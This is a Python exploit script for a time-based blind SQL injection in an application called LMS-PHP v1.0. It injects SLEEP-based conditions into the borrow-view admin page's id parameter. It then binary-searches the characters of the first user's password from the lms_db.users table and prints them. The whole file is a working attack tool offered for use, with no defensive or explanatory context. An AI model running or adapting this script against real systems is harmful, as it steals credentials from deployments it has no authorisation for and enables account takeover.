import requests
import sys
import time

class Colors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

def banner():
    print(f"{Colors.HEADER}SQL injection in LMS-PHP v1.0{Colors.ENDC}")
    print(f"{Colors.OKBLUE}---------------------------------{Colors.ENDC}\n")

def print_help():
    print("Usage: python exploit.py <URL>")
    print("Example: python exploit.py http://example.com")
    sys.exit(1)

def check_condition(url, session, condition):
    injected_url = f"{url}'+AND+IF({condition},SLEEP(5),0)--+"
    start_time = time.time()
    session.get(injected_url)
    response_time = time.time() - start_time
    return response_time >= 5

def extract_char_at_pos(url, session, pos):
    low = 32
    high = 126
    while low <= high:
        mid = (low + high) // 2
        condition = f"ascii(substring((SELECT password FROM lms_db.users WHERE id=1 LIMIT 1),{pos},1))>{mid}"
        if check_condition(url, session, condition):
            low = mid + 1
        else:
            high = mid - 1
    return chr(low)

def extract_data(url):
    session = requests.Session()
    extracted = ""
    for pos in range(1, 33):
        extracted += extract_char_at_pos(url, session, pos)
        print(f"{Colors.OKGREEN}Extracted so far: {extracted}{Colors.ENDC}")
    print(f"{Colors.OKGREEN}Full extracted data: {extracted}{Colors.ENDC}")

def main():
    banner()
    if len(sys.argv) != 2 or sys.argv[1] in ['-h', '--help']:
        print_help()

    url = sys.argv[1] + "/php-lms/admin/?page=borrow/view_borrow&id=1"
    extract_data(url)

if __name__ == "__main__":
    main()

